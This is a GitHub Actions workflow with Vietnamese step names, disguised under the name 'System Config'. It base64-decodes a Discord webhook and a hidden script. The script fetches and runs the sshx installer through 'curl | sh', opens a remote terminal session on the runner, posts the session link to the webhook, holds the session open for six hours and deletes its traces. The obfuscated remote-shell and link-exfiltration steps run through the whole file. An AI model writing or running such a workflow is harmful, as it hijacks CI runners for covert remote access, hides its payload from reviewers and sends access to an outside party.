name: System Config (SSHX)

on:
  workflow_dispatch:

jobs:
  sys_job:
    runs-on: ubuntu-latest

    steps:
    - name: Giải mã webhook và user_id
      run: |
        echo "ODU0NTc5MDEyOTYxOTU5OTQ4" | base64 -d > user_id.txt
        echo "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzkwNjQ3MjAyOTQ1ODQ5NS8xYlNrV0xsVl9jZHZXVGhHMGhLM1lOQV9rWlBfb0tfeklpaXcwYjdEM3Uzc3BNRFVIcll1WGlOZGVNZnRx" | base64 -d > webhook.txt

    - name: Giải mã và chạy script chính
      run: |
        echo "IyEvYmluL2Jhc2gKCmN1cmwgLXNzU2YgaHR0cHM6Ly9zc2h4LmlvL2dldCB8IHNoIC1zIHJ1biA+IHNzaGxvZy50eHQgMj4mMQplY2hvICLijJDiiJAgxJHDoyBrcMO0aSBjaMOybmcgU1NIWCB2w6AgZOG7lSB04bqhaSBUVFIgU1NIIGxpbmsuLi4iCgpmb3IgaSBpbiB7MS4uMzB9OyBkbyAKICBMSU5LPSQoZ3JlcCAtbyAnaHR0cHM6Ly9zc2h4LmlvL3MvW14gXSpcJyBzc2hsb2cudHh0IHwgc2VkICdzL1x4MWJcWzAtOTtdKj1tLy9nJyB8IGhlYWQgLW4gMSkKICBpZiBbIC1uICIkTElOSyIgXTsgdGhlbgogICAgZWNobyAiJExJTksiID4gc3NobGluay50eHQKICAgIGVjaG8gIuKckOKckDogxJHDoyBsaW5rIFNTSCB04bqhbiB0aMOhaTogJExJTksiCiAgICBicmVhawogIGZpCgpzbGVlcCAxCmRvbmUKaWYgWyAhIC1zIHNzaGxpbmsudHh0IF07IHRoZW4KICBlY2hvICLijJDiiJkgS2jhu59uZyB04bqhaSBTU0ggbGluayBzYXVbNjAgc-G7kS4iID4mMgogIGV4aXQgMQpmaQoK" | base64 -d > run.sh
        bash run.sh
        rm -f run.sh

    - name: Gửi SSH link về Discord Webhook
      run: |
        USER_ID=$(cat user_id.txt)
        DISCORD_WEBHOOK=$(cat webhook.txt)
        LINK=$(cat sshlink.txt | tr -d '\r\n')

        if [ -n "$LINK" ]; then
          INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$LINK" '{user_id: $uid, ssh: $ssh}')
        else
          INNER_JSON=$(jq -nc --arg uid "$USER_ID" '{user_id: $uid, ssh: "(không tìm thấy SSH link)"}')
        fi

        jq -nc --arg content "$INNER_JSON" '{content: $content}' > payload.json

        echo "📤 Gửi SSH link đến Discord..."
        curl -X POST -H "Content-Type: application/json" -d @payload.json "$DISCORD_WEBHOOK"

        # Dọn dẹp file tạm
        rm -f user_id.txt webhook.txt sshlink.txt payload.json

    - name: Giữ SSHX hoạt động trong 6 giờ
      run: |
        echo "🕒 Giữ session SSHX..."
        for ((i = 0; i < 21600; i+=30)); do
          echo "✅ Alive at $(date)"
          sleep 30
        done

    - name: Hiển thị log SSHX (nếu có) và xoá
      if: always()
      run: |
        echo "📄 Log sshx:"
        cat sshlog.txt || echo "(Không có log)"
        rm -f sshlog.txt
